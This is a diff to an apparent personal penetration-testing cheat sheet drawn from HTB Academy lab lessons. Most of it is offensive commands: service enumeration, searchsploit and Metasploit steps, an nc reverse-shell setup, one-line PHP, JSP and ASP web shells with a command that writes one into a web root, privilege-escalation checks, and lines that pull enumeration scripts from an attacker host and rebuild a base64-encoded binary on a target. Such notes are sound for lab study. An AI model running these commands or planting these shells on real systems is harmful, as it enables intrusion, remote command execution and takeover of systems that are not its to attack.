@@ -18,7 +18,7 @@ Lessons and Tutorials Covered
 > locate scripts/citrix
 > nmap --script <script name> -p<port> <host>
   
-  ## Connecting 
+## Connecting 
   # ftp =   ftp -p 10.129.42.253
   # smb =   smbclient -N -L \\\\10.129.42.253
     smbclient \\\\10.129.42.253\\users
@@ -28,7 +28,7 @@ Lessons and Tutorials Covered
     onesixtyone -c dict.txt 10.129.42.254
   
   
-  ## WEB Enumb
+## WEB Enumb
   # banner grabbing
   > curl -IL https://www.inlanefreight.com
   > whatweb 10.10.10.121
@@ -39,7 +39,7 @@ Lessons and Tutorials Covered
   # Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file.
   > gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
   
-  ## Exploit Scan
+## Exploit Scan
   # sudo apt install exploitdb -y
   > searchsploit openssh 7.2
   ## Metasploit
@@ -51,7 +51,7 @@ Lessons and Tutorials Covered
     > check
     > exploit
   
-  ## Reverse Shell
+## Reverse Shell
   # on my computer
   > nc -lvnp 1234
   > nc 10.10.10.1 1234
@@ -67,7 +67,7 @@ Lessons and Tutorials Covered
 ## Once in
   > python -c 'import pty; pty.spawn("/bin/bash")'
   
-  ## WEB SHELLS
+## WEB SHELLS
 Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
 php = <?php system($_REQUEST["cmd"]); ?>
 jsp = <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
@@ -75,7 +75,25 @@ asp = <% eval request("cmd") %>
   # eg = echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
   # browser http://SERVER_IP:PORT/shell.php?cmd=id    or curl http://SERVER_IP:PORT/shell.php?cmd=id
   
+## Privilege Escalation
+# ./linpeas.sh
+  > dpkg -l
+  > sudo -l
+  > sudo -u user /bin/echo Hello World!
+  # /etc/crontab     /etc/cron.d      /var/spool/cron/crontabs/root
   
+  
+## Transfer Files
+  # cd /tmp
+  > python3 -m http.server 8000
+  > wget http://10.10.14.1:8000/linenum.sh
+  > curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+  >  scp linenum.sh user@remotehost:/tmp/linenum.sh
+  # BASE64
+  > base64 file -w 0
+  > user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > file
+  
+
 
 * File Inclusion / Directory Traversal (HTB Academy)
 * Linux Fundermentals (HTB Academy)
